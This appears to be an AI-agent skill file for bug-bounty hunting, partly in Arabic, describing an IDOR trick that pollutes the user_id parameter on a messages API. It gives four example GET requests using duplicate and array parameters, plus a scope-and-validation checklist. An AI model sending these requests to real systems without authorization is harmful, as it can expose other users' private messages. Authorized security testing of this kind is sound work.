# SKILL: IDOR Trick: تلاعب بباراميتر user\_id بأكتر من طريقة

**Skill id:** `tip/idor-trick-تلاعب-بباراميتر-user-id-بأكتر-من-طريقة`  
**Category:** IDOR  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e8808188a791e864333b546c  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **IDOR**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

بعض الباكيندات بتتعامل مع الباراميتر المكرر أو الـ array بشكل مختلف عن القيمة العادية (بتاخد أول قيمة أو آخر قيمة أو كله)، وده ممكن يخليك توصل لبيانات مستخدم تاني.

## Payload / Code

```
الأصل:
GET /api\_v1/messages?user\_id=Your\_user\_id

جرّب:
GET /api/v1/messages?user\_id=Another\_User\_id
GET /api\_v1/messages?user\_id=Your\_user\_id&user\_id=another\_user\_id
GET /api\_v1/messages?user\_id=Another\_User\_id&user\_id=your\_user\_id
GET /api\_v1/messages?user\_id\[\]=Another\_user\_id&user\_id\[\]=your\_userid
```

## Source

Rohin Jain @th3ho... — Bug Bounty Tip #2

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
